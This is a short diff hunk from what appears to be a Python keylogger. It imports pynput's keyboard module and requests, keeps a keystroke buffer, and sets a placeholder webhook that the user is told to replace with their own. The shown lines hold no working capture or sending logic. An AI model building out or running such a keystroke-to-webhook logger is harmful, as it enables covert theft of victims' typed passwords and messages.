@@ -3,7 +3,7 @@
 import requests
 from pynput import keyboard
 
-WEBHOOK = "" #put yours here
+WEBHOOK = "webhook" #put yours here
 
 buffah = ""
 def req(text):
